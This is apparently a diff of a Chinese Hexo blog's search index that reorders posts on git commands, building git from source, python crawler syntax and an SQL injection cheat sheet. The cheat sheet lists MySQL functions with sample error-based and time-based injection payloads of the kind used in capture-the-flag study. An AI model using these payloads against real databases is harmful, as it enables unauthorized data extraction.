+<p>当手头工作没有完成时，先把工作现场git stash一下，然后去修复bug，修复后，再git stash pop，回到工作现场；</p>
+<p>在master分支上修复的bug，想要合并到当前dev分支，可以用git cherry-pick <commit id>命令，把bug提交的修改“复制”到当前分支，避免重复劳动。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git stash list 查看工作现场</span><br><span class="line"></span><br><span class="line">git stash apply 恢复现场</span><br><span class="line"></span><br><span class="line">git stash drop 删除现场</span><br><span class="line"></span><br><span class="line">git stash pop 恢复并删除现场</span><br></pre></td></tr></table></figure>
+
+<h3 id="feature分支"><a href="#feature分支" class="headerlink" title="feature分支"></a>feature分支</h3><p>开发一个新feature，最好新建一个分支；</p>
+<p>如果要丢弃一个没有被合并过的分支，可以通过git branch -D <name>强行删除。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch -D &lt;name&gt; 强行删除未合并分支</span><br></pre></td></tr></table></figure>
+
+<h3 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h3><h4 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master 推送主分支</span><br><span class="line"></span><br><span class="line">git push origin dev 推送dev分支</span><br></pre></td></tr></table></figure>
+
+<h4 id="抓取分支"><a href="#抓取分支" class="headerlink" title="抓取分支"></a>抓取分支</h4><p>查看远程库信息，使用git remote -v；</p>
+<p>本地新建的分支如果不推送到远程，对其他人就是不可见的；</p>
+<p>从本地推送分支，使用git push origin branch-name，如果推送失败，先用git pull抓取远程的新提交；</p>
+<p>在本地创建和远程分支对应的分支，使用git checkout -b branch-name origin/branch-name，本地和远程分支的名称最好一致；</p>
+<p>建立本地分支和远程分支的关联，使用git branch –set-upstream branch-name origin/branch-name；</p>
+<p>从远程抓取分支，使用git pull，如果有冲突，要先处理冲突。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b dev origin&#x2F;dev 创建远程origin的dev分支到本地</span><br><span class="line"></span><br><span class="line">git pull 抓取最新提交并合并冲突</span><br><span class="line"></span><br><span class="line">git branch --set-upstream-to&#x3D;origin&#x2F;dev dev 链接本地分支与远程分支</span><br></pre></td></tr></table></figure>
+
+<h3 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h3><p>rebase操作可以把本地未push的分叉提交历史整理成直线；</p>
+<p>rebase的目的是使得我们在查看历史提交的变化时更容易，因为分叉的提交需要三方对比。</p>
+<h3 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h3><p>标签是版本库的一个快照</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag 查看所有标签</span><br><span class="line"></span><br><span class="line">git tag &lt;tagname&gt; &lt;commit id&gt;</span><br><span class="line"></span><br><span class="line">git tag -a &lt;tagname&gt; -m &quot;message&quot; 指定标签信息命令</span><br><span class="line"></span><br><span class="line">git tag -s &lt;tagname&gt; -m &quot;message&quot; PGP签名标签命令</span><br><span class="line"></span><br><span class="line">git show &lt;tagname&gt; 查看标签信息</span><br><span class="line"></span><br><span class="line">git tag -d &lt;tagname&gt; 删除一个本地标签</span><br><span class="line"></span><br><span class="line">git push origin :refs&#x2F;tags&#x2F;&lt;tagname&gt; 删除一个远程标签</span><br><span class="line"></span><br><span class="line">git push origin &lt;tagname&gt; 推送一个本地标签</span><br><span class="line"></span><br><span class="line">git push origin --tags 推送全部未推送过的本地标签</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>开发工具</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git更新</title>
+    <url>/posts/bc46b23a/</url>
+    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
+<p>因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line"></span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br><span class="line"></span><br><span class="line">yum remove git</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.edge.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">tar -xvf git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">cd git-2.23.0&#x2F;</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line"></span><br><span class="line">echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>开发工具</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jwt总结</title>
+    <url>/posts/e8e4811b/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
   </entry>
   <entry>
     <title>flask学习</title>
@@ -1708,97 +1799,6 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
-    <title>git学习</title>
-    <url>/posts/e28ceec1/</url>
-    <content><![CDATA[<h1 id="git入门到精通"><a href="#git入门到精通" class="headerlink" title="git入门到精通"></a>git入门到精通</h1><blockquote>
-<p>跟着廖雪峰的教程走了一遍，系统学习一下，感觉挺简单的</p>
-</blockquote>
-<h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init 将目录初始化成版本库</span><br><span class="line"></span><br><span class="line">git add &lt;file&gt; 将文件添加到暂存区</span><br><span class="line"></span><br><span class="line">git commit -m &quot;message&quot; 将暂存区文件提交到版本库</span><br><span class="line"></span><br><span class="line">git status 查看库状态</span><br><span class="line"></span><br><span class="line">git diff 查看status修改文件修改内容</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log 显示从最近到最远的提交日志 --pretty&#x3D;oneline参数精简显示</span><br><span class="line"></span><br><span class="line">git reset --hard HEAD^ 回退到上个版本，HEAD表示当前版本</span><br><span class="line"></span><br><span class="line">git reset --hard &lt;commit id&gt; 回退到指定版本</span><br><span class="line"></span><br><span class="line">git reflog 记录每次指令，包括commit id</span><br><span class="line"></span><br><span class="line">git checkout -- &lt;file&gt; 丢弃工作区修改，用版本库里的版本替换工作区的版本</span><br><span class="line"></span><br><span class="line">git reset HEAD &lt;file&gt; 将暂存区修改撤销并放回工作区</span><br><span class="line"></span><br><span class="line">git rm &lt;file&gt; 工作区删除后需要rm(add)和commit</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master 把本地master分支的最新修改推送至GitHub</span><br><span class="line"></span><br><span class="line">git remote -v 查看远程库信息</span><br><span class="line"></span><br><span class="line">git remote rm origin 解除绑定</span><br><span class="line"></span><br><span class="line">git clone git@github.com:XXX&#x2F;XXX.git clone本地库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><h3 id="创建与合并分支"><a href="#创建与合并分支" class="headerlink" title="创建与合并分支"></a>创建与合并分支</h3><p>一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点：</p>
-<p><img src="https://static.liaoxuefeng.com/files/attachments/919022325462368/0"></p>
-<p>当我们创建新的分支，例如dev时，Git新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上：</p>
-<p><img src="https://www.liaoxuefeng.com/files/attachments/919022363210080/l"></p>
-<p>不过，从现在开始，对工作区的修改和提交就是针对dev分支了，比如新提交一次后，dev指针往前移动一步，而master指针不变：</p>
-<p><img src="https://www.liaoxuefeng.com/files/attachments/919022387118368/l"></p>
-<p>假如我们在dev上的工作完成了，就可以把dev合并到master上。Git怎么合并呢？最简单的方法，就是直接把master指向dev的当前提交，就完成了合并：</p>
-<p><img src="https://www.liaoxuefeng.com/files/attachments/919022412005504/0"></p>
-<p>合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支：</p>
-<p><img src="https://www.liaoxuefeng.com/files/attachments/919022479428512/0"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;dev&gt; 创建并切换分支到dev</span><br><span class="line"></span><br><span class="line">git branch &lt;name&gt; 创建分支</span><br><span class="line"></span><br><span class="line">git checkout &lt;name&gt; 切换分支</span><br><span class="line"></span><br><span class="line">git branch 查看当前分支</span><br><span class="line"></span><br><span class="line">git merge &lt;dev&gt; 将dev分支上的内容合并到master分支</span><br><span class="line"></span><br><span class="line">git branch -d &lt;dev&gt; 删除dev分支</span><br><span class="line"></span><br><span class="line">新特性switch</span><br><span class="line"></span><br><span class="line">git switch -c &lt;dev&gt; 创建并切换分支到dev</span><br><span class="line"></span><br><span class="line">git switch &lt;dev&gt; 切换分支</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="冲突解决"><a href="#冲突解决" class="headerlink" title="冲突解决"></a>冲突解决</h3><p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p>
-<p>解决冲突就是把Git合并失败的文件手动编辑为我们希望的内容，再提交。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status 查看冲突文件</span><br><span class="line">git log --graph --pretty&#x3D;oneline --abbrev-commit 查看分支合并图</span><br></pre></td></tr></table></figure>
-
-<h3 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h3><p>在实际开发中，我们应该按照几个基本原则进行分支管理：</p>
-<p>首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p>
-<p>那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；</p>
-<p>你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。</p>
-<p>所以，团队合作的分支看起来就像这样：</p>
-<p><img src="https://www.liaoxuefeng.com/files/attachments/919023260793600/0"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge --no-ff -m &quot;message&quot; &lt;dev&gt; 禁用Fast forward</span><br></pre></td></tr></table></figure>
-<h3 id="bug分支"><a href="#bug分支" class="headerlink" title="bug分支"></a>bug分支</h3><p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除；</p>
-<p>当手头工作没有完成时，先把工作现场git stash一下，然后去修复bug，修复后，再git stash pop，回到工作现场；</p>
-<p>在master分支上修复的bug，想要合并到当前dev分支，可以用git cherry-pick <commit id>命令，把bug提交的修改“复制”到当前分支，避免重复劳动。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git stash list 查看工作现场</span><br><span class="line"></span><br><span class="line">git stash apply 恢复现场</span><br><span class="line"></span><br><span class="line">git stash drop 删除现场</span><br><span class="line"></span><br><span class="line">git stash pop 恢复并删除现场</span><br></pre></td></tr></table></figure>
-
-<h3 id="feature分支"><a href="#feature分支" class="headerlink" title="feature分支"></a>feature分支</h3><p>开发一个新feature，最好新建一个分支；</p>
-<p>如果要丢弃一个没有被合并过的分支，可以通过git branch -D <name>强行删除。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch -D &lt;name&gt; 强行删除未合并分支</span><br></pre></td></tr></table></figure>
-
-<h3 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h3><h4 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master 推送主分支</span><br><span class="line"></span><br><span class="line">git push origin dev 推送dev分支</span><br></pre></td></tr></table></figure>
-
-<h4 id="抓取分支"><a href="#抓取分支" class="headerlink" title="抓取分支"></a>抓取分支</h4><p>查看远程库信息，使用git remote -v；</p>
-<p>本地新建的分支如果不推送到远程，对其他人就是不可见的；</p>
-<p>从本地推送分支，使用git push origin branch-name，如果推送失败，先用git pull抓取远程的新提交；</p>
-<p>在本地创建和远程分支对应的分支，使用git checkout -b branch-name origin/branch-name，本地和远程分支的名称最好一致；</p>
-<p>建立本地分支和远程分支的关联，使用git branch –set-upstream branch-name origin/branch-name；</p>
-<p>从远程抓取分支，使用git pull，如果有冲突，要先处理冲突。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b dev origin&#x2F;dev 创建远程origin的dev分支到本地</span><br><span class="line"></span><br><span class="line">git pull 抓取最新提交并合并冲突</span><br><span class="line"></span><br><span class="line">git branch --set-upstream-to&#x3D;origin&#x2F;dev dev 链接本地分支与远程分支</span><br></pre></td></tr></table></figure>
-
-<h3 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h3><p>rebase操作可以把本地未push的分叉提交历史整理成直线；</p>
-<p>rebase的目的是使得我们在查看历史提交的变化时更容易，因为分叉的提交需要三方对比。</p>
-<h3 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h3><p>标签是版本库的一个快照</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git tag 查看所有标签</span><br><span class="line"></span><br><span class="line">git tag &lt;tagname&gt; &lt;commit id&gt;</span><br><span class="line"></span><br><span class="line">git tag -a &lt;tagname&gt; -m &quot;message&quot; 指定标签信息命令</span><br><span class="line"></span><br><span class="line">git tag -s &lt;tagname&gt; -m &quot;message&quot; PGP签名标签命令</span><br><span class="line"></span><br><span class="line">git show &lt;tagname&gt; 查看标签信息</span><br><span class="line"></span><br><span class="line">git tag -d &lt;tagname&gt; 删除一个本地标签</span><br><span class="line"></span><br><span class="line">git push origin :refs&#x2F;tags&#x2F;&lt;tagname&gt; 删除一个远程标签</span><br><span class="line"></span><br><span class="line">git push origin &lt;tagname&gt; 推送一个本地标签</span><br><span class="line"></span><br><span class="line">git push origin --tags 推送全部未推送过的本地标签</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>开发工具</category>
-      </categories>
-      <tags>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jwt总结</title>
-    <url>/posts/e8e4811b/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git更新</title>
-    <url>/posts/bc46b23a/</url>
-    <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
-<p>因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line"></span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br><span class="line"></span><br><span class="line">yum remove git</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.edge.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">tar -xvf git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">cd git-2.23.0&#x2F;</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line"></span><br><span class="line">echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>开发工具</category>
-      </categories>
-      <tags>
-        <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>nextcloud安装及踩坑指南</title>
     <url>/posts/aa5139ab/</url>
     <content><![CDATA[<blockquote>
@@ -1902,6 +1902,24 @@ str + &#39; &#39; # 连接字符串
       </tags>
   </entry>
   <entry>
+    <title>python爬虫深入</title>
+    <url>/posts/3d5e7979/</url>
+    <content><![CDATA[<h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><p>解决json镶套索引问题</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ 根节点</span><br><span class="line"></span><br><span class="line">. 子节点</span><br><span class="line"></span><br><span class="line">.. 匹配所有子孙节点</span><br><span class="line"></span><br><span class="line">pip install jsonpath</span><br><span class="line"><span class="keyword">from</span> jsonpath <span class="keyword">import</span> jsonpath</span><br><span class="line">jsonpath.(data, &#x27;$.1.2.3.4.5.key&#x27;) -&gt; list</span><br><span class="line">jsonpath.(data, &#x27;$..key&#x27;) -&gt; list</span><br></pre></td></tr></table></figure>
+
+<h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>xpath helper插件</p>
+<p>xpath语法</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">基础语法</span><br><span class="line">//title/text() # 取标签间文本内容</span><br><span class="line">//link/@href   # 提取属性</span><br><span class="line">节点修饰语法</span><br><span class="line">/html/body/div[3]/div[1] # 标签从1开始索引</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>python学习</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python实现校园网自动登录</title>
     <url>/posts/cfeeb04a/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为每次开机都得连校园网，非常的恶心人，所以我用py写了个模拟登录校园网，也是非常的简单，因为只是我自己使用，没考虑推广，我就随便写了写，配置文件啥的都没有，感兴趣的话自己改改代码就行。</p>
@@ -1917,24 +1935,6 @@ str + &#39; &#39; # 连接字符串
 ]]></content>
       <categories>
         <category>python实践</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python爬虫深入</title>
-    <url>/posts/3d5e7979/</url>
-    <content><![CDATA[<h2 id="jsonpath"><a href="#jsonpath" class="headerlink" title="jsonpath"></a>jsonpath</h2><p>解决json镶套索引问题</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ 根节点</span><br><span class="line"></span><br><span class="line">. 子节点</span><br><span class="line"></span><br><span class="line">.. 匹配所有子孙节点</span><br><span class="line"></span><br><span class="line">pip install jsonpath</span><br><span class="line"><span class="keyword">from</span> jsonpath <span class="keyword">import</span> jsonpath</span><br><span class="line">jsonpath.(data, &#x27;$.1.2.3.4.5.key&#x27;) -&gt; list</span><br><span class="line">jsonpath.(data, &#x27;$..key&#x27;) -&gt; list</span><br></pre></td></tr></table></figure>
-
-<h2 id="lxml"><a href="#lxml" class="headerlink" title="lxml"></a>lxml</h2><p>xpath helper插件</p>
-<p>xpath语法</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">基础语法</span><br><span class="line">//title/text() # 取标签间文本内容</span><br><span class="line">//link/@href   # 提取属性</span><br><span class="line">节点修饰语法</span><br><span class="line">/html/body/div[3]/div[1] # 标签从1开始索引</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>python学习</category>
       </categories>
       <tags>
         <tag>python</tag>
@@ -2101,19 +2101,6 @@ str + &#39; &#39; # 连接字符串
       </tags>
   </entry>
   <entry>
-    <title>sql注入常用关键字</title>
-    <url>/posts/b65a1db7/</url>
-    <content><![CDATA[<h2 id="常用关键字"><a href="#常用关键字" class="headerlink" title="常用关键字"></a>常用关键字</h2><span id="more"></span>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>database()</span><br><span class="line"></span><br><span class="line">该函数可以显示当前正在使用的数据库库名。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>mid()</span><br><span class="line"></span><br><span class="line">该函数可以从指定的字段中提取出字段的内容。</span><br><span class="line"></span><br><span class="line">mid(column_name,<span class="keyword">start</span>[,length]) # <span class="keyword">start</span>索引值从<span class="number">1</span>开始</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>substr()</span><br><span class="line"></span><br><span class="line">这个函数很常用，有三个参数，按顺序分别是字符串，起始位置和长度。可以求指定字符串的子串。当然，第一个参数可以是列的名字。这个函数似乎和mid没有什么不同，如果mid或者substr中的某一个函数被禁了就用另一个</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>ord()</span><br><span class="line"></span><br><span class="line">该函数用于获得某个字符串最开始的字符的ASCII值。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>ascii()</span><br><span class="line"></span><br><span class="line">目前未发现与ord的不同。不过这样也有很大好处，那就是，如果<span class="keyword">SQL</span>注入的题目中过滤了<span class="keyword">or</span>，ord函数会躺枪，可以用ascii函数替代。</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> limit <span class="keyword">offset</span> 分页查询需要</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>concat()</span><br><span class="line"></span><br><span class="line">可以将多个字符串连接起来，参数个数无限。但是需要注意的地方就是，如果有一个参数的值是<span class="keyword">NULL</span>，那么整行结果就会返回一个<span class="keyword">NULL</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>group_concat()</span><br><span class="line"></span><br><span class="line">该函数可以将查询结果连成一行，如果只查询一列，默认用逗号分隔；如果查询多列，每一行的查询结果会直接进行字符串连接，行之间默认用逗号分隔。需要注意的是，用于分隔的默认字符可以修改。</span><br><span class="line"><span class="keyword">select</span> group_concat(username,password)<span class="keyword">result</span> <span class="keyword">from</span> users;</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>updatexml()</span><br><span class="line"></span><br><span class="line">这个主要是填写错误的xpath参数使查询报错，报错时会把xpath位置的查询结果暴露出来。如果关了回显的话就不要用这个了，可以考虑时间注入。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">第二个参数由于不符合xpath的规范，会报错。报错的时候会把version()执行的结果报出来，假设查询了flag，错误回显中会出现flag。</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span><span class="keyword">left</span>()</span><br><span class="line"></span><br><span class="line">该函数是一个字符串处理函数，用法实例:</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="string">&#x27;2019&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">返回的结果为：<span class="number">20</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span><span class="keyword">right</span>()</span><br><span class="line"></span><br><span class="line">这个和<span class="keyword">left</span>对比着记，用法实例：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">right</span>(<span class="string">&#x27;2022&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">返回的结果为：<span class="number">22</span>。</span><br><span class="line"></span><br><span class="line">很明显，substr完全可以取代<span class="keyword">left</span>和<span class="keyword">right</span>两个函数，但是如果substr和mid被禁了，<span class="keyword">left</span>和<span class="keyword">right</span>就可以结合着用。</span><br><span class="line"></span><br><span class="line"><span class="number">12.</span>elt()函数</span><br><span class="line"></span><br><span class="line">elt(n,str1,str2,str3);</span><br><span class="line"></span><br><span class="line">该函数的作用是，返回参数中的第n个字符串,参数可以是字符串常量或者列名。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> elt(<span class="number">2</span>，<span class="string">&#x27;888&#x27;</span>,<span class="string">&#x27;666&#x27;</span>);</span><br><span class="line">其返回的结果是<span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="number">13.</span>sleep()</span><br><span class="line"></span><br><span class="line">该函数的参数是一个整数t，可以在执行某操作后延迟t秒而不进行任何操作。该函数常用于处理没有回显的<span class="keyword">SQL</span>注入，根据响应的时间来确定被注入的<span class="keyword">SQL</span>语句是否执行成功了。</span><br><span class="line"></span><br><span class="line"><span class="number">14.</span>length()</span><br><span class="line"></span><br><span class="line">该函数的参数可以是字符串，或者列名。该函数的作用是获取字符串的长度。比如：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> length(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">15.</span>rand()</span><br><span class="line"></span><br><span class="line">该函数用于产生一个随机数，可以接受一个参数作为种子，也可以直接使用。</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> rand();</span><br><span class="line"></span><br><span class="line"><span class="number">16.</span><span class="built_in">floor</span>()</span><br><span class="line"></span><br><span class="line">该函数用于将一个浮点数向下取整得到整数，可以与rand函数配合使用。在特定情况下，rand、floor、<span class="built_in">count</span>(<span class="operator">*</span>)配合<span class="keyword">group</span> <span class="keyword">by</span>可以进行报错注入。</span><br><span class="line"></span><br><span class="line"><span class="number">17.</span><span class="built_in">exp</span>()</span><br><span class="line"></span><br><span class="line">这是一个数学函数，可以求e的多少次幂，当参数过大时会因为溢出<span class="number">2</span>而报错。使用该函数时，通常将查询结果取反以便得到一个非常大的数。用法如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line"><span class="number">18.</span>hex()</span><br><span class="line"></span><br><span class="line">这个函数主要用于获取字符串对应的十六进制值。用法如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> hex(<span class="string">&#x27;users&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">19.</span><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>是mysql中对查询数据进行排序的方法，后面可以跟列名或者列号（数字），两种写法等价。在<span class="keyword">sql</span>注入中，该关键字经常被用来测试一个表中有多少列，</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> username; </span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vm+kali+docker实现web题复现</title>
     <url>/posts/c52439ad/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github上有很多web题的源码，可以直接下载搭建用于赛后复现，但vps搭建比较繁琐，分配域名，分配目录，分配端口且非常不安全，虚拟机本地搭建就比较简单，而且可以直接通过宿主机访问，如果源码有docker compose的话会更加简单，一键即可搭建。</p>
@@ -2139,6 +2126,19 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入常用关键字</title>
+    <url>/posts/b65a1db7/</url>
+    <content><![CDATA[<h2 id="常用关键字"><a href="#常用关键字" class="headerlink" title="常用关键字"></a>常用关键字</h2><span id="more"></span>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>database()</span><br><span class="line"></span><br><span class="line">该函数可以显示当前正在使用的数据库库名。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>mid()</span><br><span class="line"></span><br><span class="line">该函数可以从指定的字段中提取出字段的内容。</span><br><span class="line"></span><br><span class="line">mid(column_name,<span class="keyword">start</span>[,length]) # <span class="keyword">start</span>索引值从<span class="number">1</span>开始</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>substr()</span><br><span class="line"></span><br><span class="line">这个函数很常用，有三个参数，按顺序分别是字符串，起始位置和长度。可以求指定字符串的子串。当然，第一个参数可以是列的名字。这个函数似乎和mid没有什么不同，如果mid或者substr中的某一个函数被禁了就用另一个</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>ord()</span><br><span class="line"></span><br><span 